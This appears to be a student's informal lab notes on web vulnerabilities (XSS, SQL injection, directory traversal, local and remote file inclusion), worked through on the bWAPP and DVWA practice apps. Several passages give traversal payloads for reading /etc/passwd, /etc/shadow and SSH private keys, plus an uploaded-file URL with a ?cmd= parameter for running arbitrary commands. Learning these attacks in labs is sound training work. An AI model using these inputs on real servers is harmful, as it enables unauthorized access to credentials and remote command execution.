**Recap:**
Web Vulnerabilities are weaknesses that exist within the intended purpose of a web application 
- Malicious actors can exploit these web vulnerabilities to cause unintended consequences 

 OWASP top 10 
 - Injections was in the top 3 
 
Injections: Specific type of attack that occurs when an attacker supplies untrusted input into an application 
- Payload: Processed as part of a query or command that alters the intended functionality of a program 

Types
1. Cross-site Scripting (XSS) (Inputting JavaScript (scripts) into the web applications )
	- Conducted by an attacker inserting malicious Java script into a web application
	- Depends on the application modifying the client-side code with a user's input 
2. SQL Injection (Input commands in user)
	- Conducted by an attacker inserting malicious SQL statements into a web application 
	- Depends on the application running queries against a SQL Databased

Types of Cross-site Scripting (XSS)
1. Reflected 
	- Depends on the user input being immediately returned to the user and not stored on the application's server 
2. Stored
	- Depends on the user input being stored on the application's server and later retrieved by a user accessing the web application 

Input Validation: Method used to validate the data input with a predefined logic to ensure that the input is what the application is expecting 
- IE: No special characters in username or requiring @ within email address 

Font-end components 
JavaScript and HTML 
- These languages are considered front-end components, as they form the part of the web application that the user interacts with (Typically with a browser )

Cascading style sheet (CSS). format the layout of the HTML
___
**Back-end Component Vulnerabilities**
Note: Having vulnerabilities allow malicious actor to access or display confidential files or documents that exist on an organization's private server 

![[15.2.0.jpg]]
**Intended purpose**: An application involves an user accessing a webpage and displaying prices of several products at an online store 
- Query that retrieves that product prices is the applied business logic 

![[15.2.1.jpg]]
**Not Intended**: Malicious actor change URL to access confidential files, which are NOT INTENDED to be displayed to the user 

____
**Directory Traversal** 
**Directory Traversal (Path Traversal)**: Occurs when an attacker accesses files and directories from a web applications outside an user's authorized permission 
- Using this attack could access confidential business documents, source code, or critical system files that exist within the organization's private server directly from a web applications
	- Note: This falls under *Broken access control* which is within the OWASP top 10 risk 
	- Note: If they gain access, they can control /etc or /passwd 

OWASP Explanation of broken access control; 
Restriction on what authenticated users are allowed to do are often not properly enforced
- Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users' accounts, view sensitive files, modify other users' data, change access rights, etc.

NOTES:
![[15.2.1.0.jpg]]
- Note this is a valid command 
	- Result; it will take you back to root then to home and sysadmin 

![[15.2.1.1.jpg]]
- Note this is also a valid command
	- Result; it will allow you to look at the file passwd from root 

Note: We are going to use BWAAP 
![[15.2.1.2.jpg]]
- note: Look at the URL, after = type in /etc/passwd and get these results

Go back to cmd 
Docker ps 
docker exec -it bwapp /bin/bash
cd /var/www/html/
NOTE: We do this because are wwe trying to see if we can access this file 

in the URL web browser of BWAPP
/var/www/html/web.config
NOTE: This does not work 

Go back to CMD 
ls -> Look for backdoor.php
(This is a backdoor file)

in the URL web browser of BWAPP
/var/www/html/backdoor.
![[15.2.1.3.jpg]]
- results; this is a backdoor

Trying to see etc/shadow
It does not work because you can not r the file for 
![[15.2.1.4.jpg]]
- Message.txt , anyone can read it because they have r in users 
- etc/shadow/ , can not open it or read it because they do not 
	- This files is important for admins 
	- If they do then they have assess to all unauthorized information 

www-data (This is a useless user)

**in the command**
you can also do ../../../../../../root/.ssh/id_rsa 
- This will show that they are trying to do something
- Mitigation: Go to the web management and find their ip to ban them 

you can do /etc/host
- see the network
- can see someone's network/ip tp their computer 
you can do /etc/group
-

**Real-World Challenges, impacts, and mitigations**

**Real-World**
![[15.2.2.jpg]]
Access to filesystem Structure
- Demo illustrate how modifying the URL with *dot-slash method* can cause unintended results 

**Variety of Confidential Files and Data** 
/etc/group 
- To view information on groups that exist on the server 

/etc/hosts
- To view information on how IPs are mapped to hostnames 

**Impact**
Impact of directory traversal attacks include allowing malicious actors to do the following;
- View an organization's confidential data
- View an organization's system files to determine other vulnerabilities 
- Help an attacker launch other attacks

___
![[15.2.5 1.jpg]]

http://192.168.13.25/vulnerabilities/fi/?page=include.php
In the URL -> type in /var/www/html/file1.php
- Text saying admin and ip name 

Go to CMD 
Type in 
Docker exec -it dvwa bash 
$cd /var/www/html/vulnerabilties/fi
$ls 
$cd file4.php 
- Hidden information 

To look at Password/etc
in the URL type in /etc/passwd after the = 
- This will show you the password and username of the site 
	- it is kind of ugly to read
- Right click and select source pages 
	- Look for the username and password for a more clean look 
![[15.2.1.5.jpg]]
- Find the users that has bin/bash 
- not nologin 
	- Meaning that there is no sign in, no username or password

___

**Web Application Back-end Code**
**Back-end Components:** Apply business logic to the application
- Back-end components can provide file structure, content management, and access control and include back-end language such as PHP and Java 

**Directory Traversal: Limitation Impact**
Directory traversal is a back-end component vulnerability in which an attacker access files and directories from a web application outside a user's authorized permission 

**Local files Inclusion (LFI):** Another type of back-end component vulnerability 
- Could not only allow view of unauthorized data but also impact the modification and deletion of data, as well as cause system outage
	- Note: Almost like logs for important impacts to data regardless of unauthorized and authorized interaction

**Local file inclusion:** A web application vulnerability in which an attackers tricks the application into running unintended back-end code or scripts that are local to the application's files system 
- Common examples of file upload web application includes;
	- Uploading your resume for an online job listing
	- Uploading and viewing image on a social media website
- Local File inclusion affects on which OWASP (Depending on the attack)
	- Broken access control
	- Cryptographic failure 
	- security misconfiguration

**PHP**
**Hyper Preprocessor (PHP)**: Server-side language used to develop web application 
- File extension: .php
	- Used to connect to back-end databased such as MYSQL 
	- Create and work with website cookies 
- IE: ![[15.2.6.jpg]]
	- Note: Above shows that user wants to display different types of boats at mycoolboat.com
		- Different types of boats are stored in a databased on mycoolboats.com server 
- IE 2:
- ![[15.2.7.jpg]]

Take away notes; 
1. The browser initiated a request to run the PHP script simply by accessing the page.
2. The PHP script exists and runs on the back-end server

**Real-World Challenges, Impact, and Mitigation**

**Real-World Challenges**
![[15.2.9.jpg]]

**Impact**
Malicious Actor can upload a malicious script, they can potentially;
- View Confidential files or data
- Modify or delete confidential files or data
- Modify or delete critical files to cause system disruption 

**Mitigation**
Best way to protect from LFI is to restrict user from being able to upload 
- Application requires file upload functionality then the application should use *allow listing* to ensure that only a specific file type 
	- Like .jpg can be uploaded and not script file types such as .php 

NOTE: When opening a webbrowser that allows upload or any type of input from users should be restricted. To prevent this from happening, only allow certain file types to be uploaded and inputs like scripts to be restricted. 

![[15.2.10.jpg]]
____
![[15.2.11.jpg]]
File upload tab 
Upload file called image in your desktop 
- When finishing up loading there is this prompt 
- 
./../hackable/uploads/image.jpg succesfully uploaded
- This will tell you where the file has been uploaded

type this in URL (remove the #)
192.168.13.25/vulnerabilities/upload/../../hackable/uploads/image.jpg
- Shows you the image of the file 

192.168.13.25/vulnerabilities/upload/../../hackable/uploads/image.jpg?cmd= [any linux command]
- this will let you run any command on the url 
___
**Remote File Inclusion**
RECAP:
Directory Traversal
- Back-end component vulnerability in which an attacker accesses files and directories from a web application outside a user's authorized permission 

Local file inclusion
- Another back-end component vulnerability in which and attacker tricks the application into running unintended back-end code or script that are LOCAL to the application application filesystem 
	- Local file inclusion depends on allowing a user to use unintended script that are LOCAL to the web server 

NOTE: Application preventing malicious user from adding files to their local system DOES NOT GUARANTEE that it is protected from an attacker running unintended back-end code or scripts 

**Remote file Inclusion (RFI):** Web application vulnerability in which an attacker tricks the application into running unintended back-end code or scripts that are remote to the application's file system 
- Other word; Scripts DO NOT reside on the web application's server 
- Remote files inclusion is typically conducted by modifying the parameter of an URL to point to a **remote script**
- Remote File Inclusion falls under the OWASP;
	- Broken Access control 
	- Cryptographic failures
	- Security Misconfiguration

**Real-World Challenges, Impact and Mitigation**
**Real-World Challenges**
![[15.2.13 1.jpg]]

**Impact**
Remote Access a malicious script;
- View Confidential files or data
- Modify or delete confidential files or data
- Modify or delete critical files to cause system disruption 

**Mitigation Methods**
![[15.2.14.jpg]]
- Best way to protect from RGI is to avoid passing user-submitted input to your web server 
	- This can be accomplished by using input validation

![[15.2.15.jpg]]

**Recap Back-end components**
Local Files Inclusion scripts are local to the target server
Remote files inclusion scripts are remote to target servers
